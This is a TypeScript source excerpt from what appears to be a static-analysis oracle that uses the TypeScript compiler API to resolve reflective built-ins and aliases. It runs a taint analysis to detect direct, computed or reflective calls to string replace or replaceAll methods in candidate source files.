/** Dynamic computed callees are fail-closed because replace/replaceAll cannot be excluded. */
function isDynamicComputedMethodUse(node: ts.ElementAccessExpression): boolean {
  const parent = node.parent;
  if (ts.isCallExpression(parent) && parent.expression === node) return true;
  if (ts.isTaggedTemplateExpression(parent) && parent.tag === node) return true;
  return (
    ts.isPropertyAccessExpression(parent) &&
    parent.expression === node &&
    (parent.name.text === "call" || parent.name.text === "apply" || parent.name.text === "bind")
  );
}

interface BoundOracleSource {
  readonly checker: ts.TypeChecker;
  readonly sourceFile: ts.SourceFile;
}

/** Bind one candidate without resolving imports or loading the standard library. */
function bindOracleSource(filename: string, source: string): BoundOracleSource {
  const virtualFilename = `/__repository_mutation_oracle__/${filename}`;
  const options: ts.CompilerOptions = {
    module: ts.ModuleKind.ESNext,
    noLib: true,
    noResolve: true,
    target: ts.ScriptTarget.Latest
  };
  const candidate = ts.createSourceFile(virtualFilename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const host = ts.createCompilerHost(options, true);
  host.fileExists = (requested) => requested === virtualFilename;
  host.getSourceFile = (requested) => (requested === virtualFilename ? candidate : undefined);
  host.readFile = (requested) => (requested === virtualFilename ? source : undefined);
  const program = ts.createProgram({ host, options, rootNames: [virtualFilename] });
  const sourceFile = program.getSourceFile(virtualFilename);
  if (sourceFile === undefined) throw new Error(`repository mutation oracle could not bind ${filename}`);
  return { checker: program.getTypeChecker(), sourceFile };
}

type BuiltinObjectKind = "Object" | "Reflect";
type ReflectiveGetterKind = "object.descriptor" | "reflect.descriptor" | "reflect.get";
type ReflectiveOperationKind = ReflectiveGetterKind | "reflect.apply";

interface ReflectiveOperationResolver {
  readonly resolve: (expression: ts.Expression) => ReadonlySet<ReflectiveOperationKind>;
}

/**
 * Resolve unshadowed reflective built-ins and lexical aliases by exact symbol identity.
 * Every direct assignment source of a mutable identifier is unioned conservatively;
 * parameter-forwarded aliases, nested projections, and plural descriptor maps are intentionally
 * outside this bounded checked-in-source oracle.
 */
function reflectiveOperationResolver(
  sourceFile: ts.SourceFile,
  checker: ts.TypeChecker,
  stringResolver: ComputedMethodResolver
): ReflectiveOperationResolver {
  const assignmentSources = new Map<ts.Symbol, ts.Expression[]>();
  const destructuringAssignmentSources = new Map<
    ts.Symbol,
    Array<{ readonly name: ts.PropertyName; readonly owner: ts.Expression }>
  >();
  const variableSourceCache = new Map<ts.Symbol, readonly ts.Expression[]>();

  function collectAssignmentSources(node: ts.Node): void {
    if (ts.isBinaryExpression(node) && isAliasAssignmentToken(node.operatorToken.kind)) {
      const left = unwrapStaticExpression(node.left);
      if (ts.isIdentifier(left)) {
        const symbol = checker.getSymbolAtLocation(left);
        if (symbol !== undefined) {
          const sources = assignmentSources.get(symbol) ?? [];
          sources.push(node.right);
          assignmentSources.set(symbol, sources);
        }
      } else if (node.operatorToken.kind === ts.SyntaxKind.EqualsToken && ts.isObjectLiteralExpression(left)) {
        for (const property of left.properties) {
          let target: ts.Identifier | null = null;
          let fallback: ts.Expression | undefined;
          if (ts.isShorthandPropertyAssignment(property)) {
            target = property.name;
            fallback = property.objectAssignmentInitializer;
          } else if (ts.isPropertyAssignment(property)) {
            const assignmentTarget = flatAssignmentTarget(property.initializer);
            target = assignmentTarget?.target ?? null;
            fallback = assignmentTarget?.fallback;
          }
          if (target === null) continue;
          const symbol = checker.getSymbolAtLocation(target);
          if (symbol === undefined) continue;
          if (fallback !== undefined) {
            const sources = assignmentSources.get(symbol) ?? [];
            sources.push(fallback);
            assignmentSources.set(symbol, sources);
          }
          const sources = destructuringAssignmentSources.get(symbol) ?? [];
          sources.push({ name: property.name, owner: node.right });
          destructuringAssignmentSources.set(symbol, sources);
        }
      }
    }
    ts.forEachChild(node, collectAssignmentSources);
  }
  collectAssignmentSources(sourceFile);

  function variableValueSources(symbol: ts.Symbol): readonly ts.Expression[] {
    const cached = variableSourceCache.get(symbol);
    if (cached !== undefined) return cached;
    const declarations = symbol.declarations ?? [];
    if (declarations.length !== 1) return [];
    const declaration = declarations[0];
    if (
      declaration === undefined ||
      !ts.isVariableDeclaration(declaration) ||
      !ts.isIdentifier(declaration.name)
    ) {
      return [];
    }
    const sources: ts.Expression[] = [];
    if (declaration.initializer !== undefined) sources.push(declaration.initializer);
    sources.push(...(assignmentSources.get(symbol) ?? []));
    variableSourceCache.set(symbol, sources);
    return sources;
  }

  function accessNames(node: ts.PropertyAccessExpression | ts.ElementAccessExpression): StaticStringResolution {
    return ts.isPropertyAccessExpression(node)
      ? { hasUnknown: false, values: new Set([node.name.text]) }
      : stringResolver.resolve(node.argumentExpression);
  }

  function ownerKinds(
    expression: ts.Expression,
    resolving: ReadonlySet<ts.Symbol> = new Set()
  ): ReadonlySet<BuiltinObjectKind> {
    const current = unwrapStaticExpression(expression);
    if (ts.isConditionalExpression(current)) {
      return new Set([...ownerKinds(current.whenTrue, resolving), ...ownerKinds(current.whenFalse, resolving)]);
    }
    if (ts.isCommaListExpression(current)) {
      const result = current.elements[current.elements.length - 1];
      return result === undefined ? new Set() : ownerKinds(result, resolving);
    }
    if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.CommaToken) {
      return ownerKinds(current.right, resolving);
    }
    if (ts.isBinaryExpression(current) && isLogicalValueToken(current.operatorToken.kind)) {
      return new Set([...ownerKinds(current.left, resolving), ...ownerKinds(current.right, resolving)]);
    }
    if (ts.isBinaryExpression(current) && isAliasAssignmentToken(current.operatorToken.kind)) {
      if (current.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
        return ownerKinds(current.right, resolving);
      }
      return new Set([...ownerKinds(current.left, resolving), ...ownerKinds(current.right, resolving)]);
    }
    if (ts.isIdentifier(current)) {
      const symbol = checker.getSymbolAtLocation(current);
      if (
        (symbol === undefined || !symbolHasRuntimeValueBinding(symbol)) &&
        (current.text === "Object" || current.text === "Reflect")
      ) {
        return new Set<BuiltinObjectKind>([current.text]);
      }
      if (symbol === undefined || resolving.has(symbol)) return new Set();
      const nextResolving = new Set([...resolving, symbol]);
      return new Set(variableValueSources(symbol).flatMap((source) => [...ownerKinds(source, nextResolving)]));
    }
    if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
      const owner = unwrapStaticExpression(current.expression);
      const ownerSymbol = ts.isIdentifier(owner) ? checker.getSymbolAtLocation(owner) : undefined;
      if (
        !ts.isIdentifier(owner) ||
        owner.text !== "globalThis" ||
        (ownerSymbol !== undefined && symbolHasRuntimeValueBinding(ownerSymbol))
      ) {
        return new Set();
      }
      const names = accessNames(current).values;
      return new Set([...names].filter((name): name is BuiltinObjectKind => name === "Object" || name === "Reflect"));
    }
    return new Set();
  }

  function operationsFor(
    owners: ReadonlySet<BuiltinObjectKind>,
    names: ReadonlySet<string>
  ): ReadonlySet<ReflectiveOperationKind> {
    const operations = new Set<ReflectiveOperationKind>();
    for (const owner of owners) {
      for (const name of names) {
        if (owner === "Reflect" && name === "get") operations.add("reflect.get");
        if (owner === "Reflect" && name === "getOwnPropertyDescriptor") operations.add("reflect.descriptor");
        if (owner === "Reflect" && name === "apply") operations.add("reflect.apply");
        if (owner === "Object" && name === "getOwnPropertyDescriptor") operations.add("object.descriptor");
      }
    }
    return operations;
  }

  function destructuringAssignmentOperations(
    symbol: ts.Symbol,
    resolving: ReadonlySet<ts.Symbol>
  ): ReadonlySet<ReflectiveOperationKind> {
    const operations = new Set<ReflectiveOperationKind>();
    for (const assignment of destructuringAssignmentSources.get(symbol) ?? []) {
      const names = ts.isComputedPropertyName(assignment.name)
        ? stringResolver.resolve(assignment.name.expression).values
        : new Set([staticPropertyText(assignment.name) ?? ""]);
      for (const operation of operationsFor(ownerKinds(assignment.owner, resolving), names)) {
        operations.add(operation);
      }
    }
    return operations;
  }

  function bindingElementOperations(
    declaration: ts.BindingElement,
    resolving: ReadonlySet<ts.Symbol>
  ): ReadonlySet<ReflectiveOperationKind> {
    if (!ts.isObjectBindingPattern(declaration.parent)) return new Set();
    const variableDeclaration = declaration.parent.parent;
    if (
      !ts.isVariableDeclaration(variableDeclaration) ||
      variableDeclaration.initializer === undefined ||
      !ts.isVariableDeclarationList(variableDeclaration.parent)
    ) {
      return new Set();
    }
    const names =
      declaration.propertyName !== undefined && ts.isComputedPropertyName(declaration.propertyName)
        ? stringResolver.resolve(declaration.propertyName.expression).values
        : new Set([staticPropertyText(declaration.propertyName ?? declaration.name) ?? ""]);
    return new Set([
      ...operationsFor(ownerKinds(variableDeclaration.initializer, resolving), names),
      ...(declaration.initializer === undefined ? [] : resolve(declaration.initializer, resolving))
    ]);
  }

  function resolve(
    expression: ts.Expression,
    resolving: ReadonlySet<ts.Symbol> = new Set()
  ): ReadonlySet<ReflectiveOperationKind> {
    const current = unwrapStaticExpression(expression);
    if (ts.isConditionalExpression(current)) {
      return new Set([...resolve(current.whenTrue, resolving), ...resolve(current.whenFalse, resolving)]);
    }
    if (ts.isCommaListExpression(current)) {
      const result = current.elements[current.elements.length - 1];
      return result === undefined ? new Set() : resolve(result, resolving);
    }
    if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.CommaToken) {
      return resolve(current.right, resolving);
    }
    if (ts.isBinaryExpression(current) && isLogicalValueToken(current.operatorToken.kind)) {
      return new Set([...resolve(current.left, resolving), ...resolve(current.right, resolving)]);
    }
    if (ts.isBinaryExpression(current) && isAliasAssignmentToken(current.operatorToken.kind)) {
      if (current.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
        return resolve(current.right, resolving);
      }
      return new Set([...resolve(current.left, resolving), ...resolve(current.right, resolving)]);
    }
    if (ts.isCallExpression(current)) {
      const callee = unwrapStaticExpression(current.expression);
      if (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) {
        const invocationNames = ts.isPropertyAccessExpression(callee)
          ? new Set([callee.name.text])
          : stringResolver.resolve(callee.argumentExpression).values;
        if (invocationNames.has("bind") && current.arguments.length <= 1) {
          return resolve(callee.expression, resolving);
        }
      }
      return new Set();
    }
    if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
      return operationsFor(ownerKinds(current.expression), accessNames(current).values);
    }
    if (!ts.isIdentifier(current)) return new Set();
    const symbol = checker.getSymbolAtLocation(current);
    if (symbol === undefined || resolving.has(symbol)) return new Set();
    const declarations = symbol.declarations ?? [];
    if (declarations.length !== 1) return new Set();
    const declaration = declarations[0];
    if (declaration === undefined) return new Set();
    const nextResolving = new Set([...resolving, symbol]);
    const assignedByDestructuring = destructuringAssignmentOperations(symbol, nextResolving);
    if (ts.isBindingElement(declaration)) {
      return new Set([
        ...bindingElementOperations(declaration, nextResolving),
        ...(assignmentSources.get(symbol) ?? []).flatMap((source) => [...resolve(source, nextResolving)]),
        ...assignedByDestructuring
      ]);
    }
    return new Set([
      ...variableValueSources(symbol).flatMap((source) => [...resolve(source, nextResolving)]),
      ...assignedByDestructuring
    ]);
  }

  return { resolve };
}

interface ReflectiveAcquisition {
  readonly getters: ReadonlySet<ReflectiveGetterKind>;
  readonly key: StaticStringResolution;
}

/** Resolve the getter identity and property-key possibilities of one reflective acquisition. */
function reflectiveAcquisition(
  node: ts.CallExpression,
  operationResolver: ReflectiveOperationResolver,
  stringResolver: ComputedMethodResolver
): ReflectiveAcquisition | null {
  const getterOperations = (expression: ts.Expression): ReadonlySet<ReflectiveGetterKind> =>
    new Set(
      [...operationResolver.resolve(expression)].filter(
        (operation): operation is ReflectiveGetterKind => operation !== "reflect.apply"
      )
    );
  const acquisition = (
    getterExpression: ts.Expression,
    keyExpression: ts.Expression | undefined
  ): ReflectiveAcquisition | null => {
    if (keyExpression === undefined) return null;
    const getters = getterOperations(getterExpression);
    return getters.size === 0 ? null : { getters, key: stringResolver.resolve(keyExpression) };
  };
  const arrayArgument = (expression: ts.Expression | undefined, index: number): ts.Expression | undefined => {
    if (expression === undefined) return undefined;
    const current = unwrapStaticExpression(expression);
    if (!ts.isArrayLiteralExpression(current)) return undefined;
    const element = current.elements[index];
    return element === undefined || ts.isOmittedExpression(element) || ts.isSpreadElement(element)
      ? undefined
      : element;
  };

  if (node.arguments.length >= 2) {
    const direct = acquisition(node.expression, node.arguments[1]);
    if (direct !== null) return direct;
  }

  const callee = unwrapStaticExpression(node.expression);
  if (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) {
    const invocationNames = ts.isPropertyAccessExpression(callee)
      ? new Set([callee.name.text])
      : stringResolver.resolve(callee.argumentExpression).values;
    if (invocationNames.has("call")) {
      const called = acquisition(callee.expression, node.arguments[2]);
      if (called !== null) return called;
    }
    if (invocationNames.has("apply")) {
      const applied = acquisition(callee.expression, arrayArgument(node.arguments[1], 1));
      if (applied !== null) return applied;
    }
  }

  if (operationResolver.resolve(node.expression).has("reflect.apply")) {
    const getterExpression = node.arguments[0];
    const keyExpression = arrayArgument(node.arguments[2], 1);
    if (getterExpression !== undefined) return acquisition(getterExpression, keyExpression);
  }
  return null;
}

interface DynamicMethodTaintAnalysis {
  readonly expressionIsTainted: (expression: ts.Expression) => boolean;
}

const METHOD_VALUE_TAINT = 1;
const DESCRIPTOR_VALUE_TAINT = 2;

/**
 * Propagate unresolved computed/reflective method values by symbol, including
 * direct local argument-to-parameter flow and direct local function returns.
 */
function dynamicComputedMethodTaintAnalysis(
  sourceFile: ts.SourceFile,
  checker: ts.TypeChecker,
  methodResolver: ComputedMethodResolver,
  operationResolver: ReflectiveOperationResolver
): DynamicMethodTaintAnalysis {
  const valueEdges: Array<{ readonly expression: ts.Expression; readonly target: ts.Symbol }> = [];
  const returnEdges: Array<{ readonly expression: ts.Expression; readonly target: ts.Symbol }> = [];
  const propertyEdges: Array<{
    readonly expression: ts.Expression;
    readonly key: string;
    readonly owner: ts.Symbol;
  }> = [];
  const objectAliasEdges: Array<{ readonly source: ts.Symbol; readonly target: ts.Symbol }> = [];
  const propertyProjectionEdges: Array<{
    readonly key: string;
    readonly owner: ts.Expression;
    readonly target: ts.Symbol;
  }> = [];
  const callExpressions: ts.CallExpression[] = [];
  const localFunctions = new Map<ts.Symbol, ts.FunctionLikeDeclaration>();
  const functionSymbols = new Map<ts.FunctionLikeDeclaration, ts.Symbol>();

  const symbolOf = (identifier: ts.Identifier): ts.Symbol | null => checker.getSymbolAtLocation(identifier) ?? null;

  function exactStaticKey(name: ts.PropertyName): string | null {
    if (!ts.isComputedPropertyName(name)) return staticPropertyText(name);
    const resolution = methodResolver.resolve(name.expression);
    if (resolution.hasUnknown || resolution.values.size !== 1) return null;
    return [...resolution.values][0] ?? null;
  }

  function collectBindingProjectionEdges(pattern: ts.ObjectBindingPattern, owner: ts.Expression): void {
    for (const element of pattern.elements) {
      if (element.dotDotDotToken !== undefined || !ts.isIdentifier(element.name)) continue;
      const key = exactStaticKey(element.propertyName ?? element.name);
      const target = symbolOf(element.name);
      if (target === null) continue;
      if (key !== null) propertyProjectionEdges.push({ key, owner, target });
      if (element.initializer !== undefined) valueEdges.push({ expression: element.initializer, target });
    }
  }

  function collectAssignmentProjectionEdges(pattern: ts.ObjectLiteralExpression, owner: ts.Expression): void {
    for (const property of pattern.properties) {
      if (ts.isShorthandPropertyAssignment(property)) {
        const target = symbolOf(property.name);
        if (target !== null) {
          propertyProjectionEdges.push({ key: property.name.text, owner, target });
          if (property.objectAssignmentInitializer !== undefined) {
            valueEdges.push({ expression: property.objectAssignmentInitializer, target });
          }
        }
        continue;
      }
      if (!ts.isPropertyAssignment(property)) continue;
      const targetExpression = flatAssignmentTarget(property.initializer);
      if (targetExpression === null) continue;
      const key = exactStaticKey(property.name);
      const target = symbolOf(targetExpression.target);
      if (target === null) continue;
      if (key !== null) propertyProjectionEdges.push({ key, owner, target });
      if (targetExpression.fallback !== undefined) {
        valueEdges.push({ expression: targetExpression.fallback, target });
      }
    }
  }

  function registerFunction(symbol: ts.Symbol | null, declaration: ts.FunctionLikeDeclaration): void {
    if (symbol === null) return;
    localFunctions.set(symbol, declaration);
    functionSymbols.set(declaration, symbol);
  }
  function collectFunctions(node: ts.Node): void {
    if (ts.isFunctionDeclaration(node) && node.name !== undefined) {
      registerFunction(symbolOf(node.name), node);
    } else if (ts.isVariableDeclaration(node) && ts.isIdentifier(node.name) && node.initializer !== undefined) {
      const initializer = unwrapStaticExpression(node.initializer);
      if (ts.isArrowFunction(initializer) || ts.isFunctionExpression(initializer)) {
        registerFunction(symbolOf(node.name), initializer);
      }
    }
    ts.forEachChild(node, collectFunctions);
  }
  collectFunctions(sourceFile);

  function collectReturns(declaration: ts.FunctionLikeDeclaration, symbol: ts.Symbol): void {
    if (ts.isArrowFunction(declaration) && !ts.isBlock(declaration.body)) {
      returnEdges.push({ expression: declaration.body, target: symbol });
      return;
    }
    const body = declaration.body;
    if (body === undefined) return;
    function visitReturn(node: ts.Node): void {
      if (node !== body && ts.isFunctionLike(node)) return;
      if (ts.isReturnStatement(node) && node.expression !== undefined) {
        returnEdges.push({ expression: node.expression, target: symbol });
      }
      ts.forEachChild(node, visitReturn);
    }
    visitReturn(body);
  }
  for (const [declaration, symbol] of functionSymbols) collectReturns(declaration, symbol);

  function collectObjectLiteralEdges(owner: ts.Symbol, object: ts.ObjectLiteralExpression): void {
    for (const property of object.properties) {
      if (ts.isPropertyAssignment(property)) {
        const key = exactStaticKey(property.name);
        if (key !== null) propertyEdges.push({ expression: property.initializer, key, owner });
      } else if (ts.isShorthandPropertyAssignment(property)) {
        propertyEdges.push({ expression: property.name, key: property.name.text, owner });
      }
    }
  }

  function collectObjectAliasEdges(source: ts.Symbol, target: ts.Symbol): void {
    objectAliasEdges.push({ source, target }, { source: target, target: source });
  }

  function collectEdges(node: ts.Node): void {
    if (ts.isVariableDeclaration(node) && ts.isIdentifier(node.name) && node.initializer !== undefined) {
      const target = symbolOf(node.name);
      if (target !== null) {
        valueEdges.push({ expression: node.initializer, target });
        const initializer = unwrapStaticExpression(node.initializer);
        if (ts.isObjectLiteralExpression(initializer)) collectObjectLiteralEdges(target, initializer);
        if (ts.isIdentifier(initializer)) {
          const source = symbolOf(initializer);
          if (source !== null) collectObjectAliasEdges(source, target);
        }
      }
    } else if (
      ts.isVariableDeclaration(node) &&
      ts.isObjectBindingPattern(node.name) &&
      node.initializer !== undefined
    ) {
      collectBindingProjectionEdges(node.name, node.initializer);
    }
    if (ts.isBinaryExpression(node) && isAliasAssignmentToken(node.operatorToken.kind)) {
      const left = unwrapStaticExpression(node.left);
      if (ts.isIdentifier(left)) {
        const target = symbolOf(left);
        if (target !== null) {
          valueEdges.push({ expression: node.right, target });
          const right = unwrapStaticExpression(node.right);
          if (ts.isObjectLiteralExpression(right)) collectObjectLiteralEdges(target, right);
          if (ts.isIdentifier(right)) {
            const source = symbolOf(right);
            if (source !== null) collectObjectAliasEdges(source, target);
          }
        }
      } else if (node.operatorToken.kind === ts.SyntaxKind.EqualsToken && ts.isObjectLiteralExpression(left)) {
        collectAssignmentProjectionEdges(left, node.right);
      } else if (ts.isPropertyAccessExpression(left) || ts.isElementAccessExpression(left)) {
        const ownerExpression = unwrapStaticExpression(left.expression);
        const keyResolution = ts.isPropertyAccessExpression(left)
          ? { hasUnknown: false, values: new Set([left.name.text]) }
          : methodResolver.resolve(left.argumentExpression);
        const key =
          !keyResolution.hasUnknown && keyResolution.values.size === 1 ? ([...keyResolution.values][0] ?? null) : null;
        if (ts.isIdentifier(ownerExpression) && key !== null) {
          const owner = symbolOf(ownerExpression);
          if (owner !== null) propertyEdges.push({ expression: node.right, key, owner });
        }
      }
    }
    if (ts.isCallExpression(node)) {
      callExpressions.push(node);
    }
    ts.forEachChild(node, collectEdges);
  }
  collectEdges(sourceFile);

  // Close direct local function identity over exact-symbol aliases before
  // deriving argument-to-parameter edges at any call site.
  for (let pass = 0; pass <= valueEdges.length; pass++) {
    let changed = false;
    for (const edge of valueEdges) {
      const source = unwrapStaticExpression(edge.expression);
      if (!ts.isIdentifier(source) || localFunctions.has(edge.target)) continue;
      const sourceSymbol = symbolOf(source);
      const declaration = sourceSymbol === null ? undefined : localFunctions.get(sourceSymbol);
      if (declaration !== undefined) {
        localFunctions.set(edge.target, declaration);
        changed = true;
      }
    }
    if (!changed) break;
  }
  for (const call of callExpressions) {
    const callee = unwrapStaticExpression(call.expression);
    if (!ts.isIdentifier(callee)) continue;
    const calleeSymbol = symbolOf(callee);
    const declaration = calleeSymbol === null ? undefined : localFunctions.get(calleeSymbol);
    if (declaration === undefined) continue;
    for (const [index, parameter] of declaration.parameters.entries()) {
      const argument = call.arguments[index];
      if (argument === undefined) continue;
      if (ts.isIdentifier(parameter.name)) {
        const target = symbolOf(parameter.name);
        if (target !== null) valueEdges.push({ expression: argument, target });
      } else if (ts.isObjectBindingPattern(parameter.name)) {
        collectBindingProjectionEdges(parameter.name, argument);
      }
    }
  }

  const taintedValues = new Map<ts.Symbol, number>();
  const taintedReturns = new Map<ts.Symbol, number>();
  const taintedProperties = new Map<ts.Symbol, Map<string, number>>();

  function mergeTaint(map: Map<ts.Symbol, number>, symbol: ts.Symbol, taint: number): boolean {
    const before = map.get(symbol) ?? 0;
    const after = before | taint;
    if (after === before) return false;
    map.set(symbol, after);
    return true;
  }

  function propertyTaint(owner: ts.Symbol, key: string): number {
    return taintedProperties.get(owner)?.get(key) ?? 0;
  }

  function mergePropertyTaint(owner: ts.Symbol, key: string, taint: number): boolean {
    const properties = taintedProperties.get(owner) ?? new Map<string, number>();
    const before = properties.get(key) ?? 0;
    const after = before | taint;
    if (after === before) return false;
    properties.set(key, after);
    taintedProperties.set(owner, properties);
    return true;
  }

  const expressionTaint = (expression: ts.Expression): number => {
    const current = unwrapStaticExpression(expression);
    if (ts.isAwaitExpression(current)) return expressionTaint(current.expression);
    if (ts.isIdentifier(current)) {
      const symbol = symbolOf(current);
      return symbol === null ? 0 : (taintedValues.get(symbol) ?? 0);
    }
    if (ts.isConditionalExpression(current)) {
      return expressionTaint(current.whenTrue) | expressionTaint(current.whenFalse);
    }
    if (ts.isCommaListExpression(current)) {
      const result = current.elements[current.elements.length - 1];
      return result === undefined ? 0 : expressionTaint(result);
    }
    if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.CommaToken) {
      return expressionTaint(current.right);
    }
    if (ts.isBinaryExpression(current) && isLogicalValueToken(current.operatorToken.kind)) {
      return expressionTaint(current.left) | expressionTaint(current.right);
    }
    if (ts.isBinaryExpression(current) && isAliasAssignmentToken(current.operatorToken.kind)) {
      const leftTaint = current.operatorToken.kind === ts.SyntaxKind.EqualsToken ? 0 : expressionTaint(current.left);
      return leftTaint | expressionTaint(current.right);
    }
    if (ts.isCallExpression(current)) {
      const acquisition = reflectiveAcquisition(current, operationResolver, methodResolver);
      if (
        acquisition?.key.hasUnknown &&
        !acquisition.key.values.has("replace") &&
        !acquisition.key.values.has("replaceAll")
      ) {
        let taint = 0;
        if (acquisition.getters.has("reflect.get")) taint |= METHOD_VALUE_TAINT;
        if (acquisition.getters.has("object.descriptor") || acquisition.getters.has("reflect.descriptor")) {
          taint |= DESCRIPTOR_VALUE_TAINT;
        }
        return taint;
      }
      const callee = unwrapStaticExpression(current.expression);
      if (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) {
        const methodNames = ts.isPropertyAccessExpression(callee)
          ? new Set([callee.name.text])
          : methodResolver.resolve(callee.argumentExpression).values;
        if (methodNames.has("bind") && (expressionTaint(callee.expression) & METHOD_VALUE_TAINT) !== 0) {
          return METHOD_VALUE_TAINT;
        }
      }
      if (!ts.isIdentifier(callee)) return 0;
      const symbol = symbolOf(callee);
      return symbol === null ? 0 : (taintedReturns.get(symbol) ?? 0);
    }
    if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
      const owner = unwrapStaticExpression(current.expression);
      const propertyResolution = ts.isPropertyAccessExpression(current)
        ? { hasUnknown: false, values: new Set([current.name.text]) }
        : methodResolver.resolve(current.argumentExpression);
      let taint = 0;
      for (const propertyName of propertyResolution.values) {
        taint |= projectedPropertyTaint(owner, propertyName);
      }
      if (ts.isElementAccessExpression(current)) {
        if (propertyResolution.values.has("replace") || propertyResolution.values.has("replaceAll")) {
          taint |= METHOD_VALUE_TAINT;
        }
        if (propertyResolution.hasUnknown) taint |= METHOD_VALUE_TAINT;
      }
      return taint;
    }
    return 0;
  };

  function projectedPropertyTaint(ownerExpression: ts.Expression, key: string): number {
    const owner = unwrapStaticExpression(ownerExpression);
    if (ts.isConditionalExpression(owner)) {
      return projectedPropertyTaint(owner.whenTrue, key) | projectedPropertyTaint(owner.whenFalse, key);
    }
    if (ts.isCommaListExpression(owner)) {
      const result = owner.elements[owner.elements.length - 1];
      return result === undefined ? 0 : projectedPropertyTaint(result, key);
    }
    if (ts.isBinaryExpression(owner) && owner.operatorToken.kind === ts.SyntaxKind.CommaToken) {
      return projectedPropertyTaint(owner.right, key);
    }
    if (ts.isBinaryExpression(owner) && isLogicalValueToken(owner.operatorToken.kind)) {
      return projectedPropertyTaint(owner.left, key) | projectedPropertyTaint(owner.right, key);
    }
    if (ts.isBinaryExpression(owner) && isAliasAssignmentToken(owner.operatorToken.kind)) {
      const leftTaint =
        owner.operatorToken.kind === ts.SyntaxKind.EqualsToken ? 0 : projectedPropertyTaint(owner.left, key);
      return leftTaint | projectedPropertyTaint(owner.right, key);
    }
    let taint = key === "value" && (expressionTaint(owner) & DESCRIPTOR_VALUE_TAINT) !== 0 ? METHOD_VALUE_TAINT : 0;
    if (ts.isObjectLiteralExpression(owner)) {
      for (const property of owner.properties) {
        if (
          (ts.isPropertyAssignment(property) || ts.isShorthandPropertyAssignment(property)) &&
          exactStaticKey(property.name) === key
        ) {
          taint |= expressionTaint(ts.isPropertyAssignment(property) ? property.initializer : property.name);
        }
      }
    }
    if (ts.isIdentifier(owner)) {
      const ownerSymbol = symbolOf(owner);
      if (ownerSymbol !== null) taint |= propertyTaint(ownerSymbol, key);
    }
    return taint;
  }

  const edgeCount =
    valueEdges.length +
    returnEdges.length +
    propertyEdges.length +
    objectAliasEdges.length +
    propertyProjectionEdges.length;
  for (let pass = 0; pass <= edgeCount; pass++) {
    let changed = false;
    for (const edge of valueEdges) {
      if (mergeTaint(taintedValues, edge.target, expressionTaint(edge.expression))) changed = true;
      const source = unwrapStaticExpression(edge.expression);
      if (ts.isIdentifier(source)) {
        const sourceSymbol = symbolOf(source);
        if (
          sourceSymbol !== null &&
          mergeTaint(taintedReturns, edge.target, taintedReturns.get(sourceSymbol) ?? 0)
        ) {
          changed = true;
        }
      }
    }
    for (const edge of returnEdges) {
      if (mergeTaint(taintedReturns, edge.target, expressionTaint(edge.expression))) changed = true;
    }
    for (const edge of propertyEdges) {
      if (mergePropertyTaint(edge.owner, edge.key, expressionTaint(edge.expression))) changed = true;
    }
    for (const edge of objectAliasEdges) {
      const sourceProperties = taintedProperties.get(edge.source);
      if (sourceProperties === undefined) continue;
      for (const [key, taint] of sourceProperties) {
        if (mergePropertyTaint(edge.target, key, taint)) changed = true;
      }
    }
    for (const edge of propertyProjectionEdges) {
      if (mergeTaint(taintedValues, edge.target, projectedPropertyTaint(edge.owner, edge.key))) changed = true;
    }
    if (!changed) break;
  }
  return { expressionIsTainted: (expression) => (expressionTaint(expression) & METHOD_VALUE_TAINT) !== 0 };
}

/** True when an extracted unresolved computed value reaches an invocation sink. */
function isTaintedDynamicMethodInvocation(
  node: ts.CallExpression,
  analysis: DynamicMethodTaintAnalysis,
  methodResolver: ComputedMethodResolver,
  operationResolver: ReflectiveOperationResolver
): boolean {
  const firstArgument = node.arguments[0];
  if (
    operationResolver.resolve(node.expression).has("reflect.apply") &&
    firstArgument !== undefined &&
    analysis.expressionIsTainted(firstArgument)
  ) {
    return true;
  }
  const callee = unwrapStaticExpression(node.expression);
  if (ts.isElementAccessExpression(callee)) {
    const directMethod = computedMethodText(callee.argumentExpression, methodResolver);
    if (
      directMethod !== null ||
      isUnresolvedComputedMethod(callee.argumentExpression, methodResolver)
    ) {
      return false;
    }
  }
  if (
    (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) &&
    ts.isElementAccessExpression(unwrapStaticExpression(callee.expression)) &&
    isUnresolvedComputedMethod(
      (unwrapStaticExpression(callee.expression) as ts.ElementAccessExpression).argumentExpression,
      methodResolver
    )
  ) {
    return false;
  }
  if (analysis.expressionIsTainted(callee)) return true;
  if (
    (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) &&
    analysis.expressionIsTainted(callee.expression)
  ) {
    const methods = ts.isPropertyAccessExpression(callee)
      ? new Set([callee.name.text])
      : methodResolver.resolve(callee.argumentExpression).values;
    return methods.has("call") || methods.has("apply");
  }
  return false;
}

/** True when an extracted unresolved computed value reaches a tagged-template sink. */
function isTaintedDynamicMethodTagInvocation(
  node: ts.TaggedTemplateExpression,
  analysis: DynamicMethodTaintAnalysis,
  methodResolver: ComputedMethodResolver
): boolean {
  const tag = unwrapStaticExpression(node.tag);
  if (ts.isElementAccessExpression(tag) && isUnresolvedComputedMethod(tag.argumentExpression, methodResolver)) {
    return false;
  }
  return analysis.expressionIsTainted(tag);
}

/**
 * Resolve a statically replace-spelled reflective acquisition through exact
 * unshadowed built-ins or the explicitly reviewed lexical alias forms. Unknown
 * keys are handled separately by the invocation-taint analysis, so passive Proxy forwarding is
 * not mislabeled as an executed mutation.
 */
function reflectiveReplaceMethod(
  node: ts.CallExpression,
  operationResolver: ReflectiveOperationResolver,
  methodResolver: ComputedMethodResolver
): ForbiddenReplaceMethod | null {
  const acquisition = reflectiveAcquisition(node, operationResolver, methodResolver);
  if (acquisition === null) return null;
  if (acquisition.key.values.has("replace")) return "replace";
  return acquisition.key.values.has("replaceAll") ? "replaceAll" : null;
}

